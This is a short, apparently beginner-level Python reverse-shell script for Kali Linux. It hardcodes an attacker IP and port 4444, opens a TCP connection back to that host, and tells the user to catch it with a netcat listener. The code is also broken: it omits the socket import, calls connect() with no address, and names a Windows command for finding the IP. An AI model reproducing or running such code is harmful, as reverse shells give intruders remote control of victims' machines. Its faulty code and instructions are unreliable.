#!/usr/bin/python3

#In some Kali systems,python files are available at /bin/python3 ,so please use accordingly

HOST = '192.168.43.176';  #Use your Kali machine's IP Address
# Command to find IP Address-ipconfig
PORT = 4444;  #Connect to port of your choice
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);  #AF_NET=IP Address    SOCK_STREAM=Port
s.connect();  #Create connection via IP and port combination

#Start your netcat listener on another tab
#Command - nc -lvp <port> - You will receive a reverse connection,but dies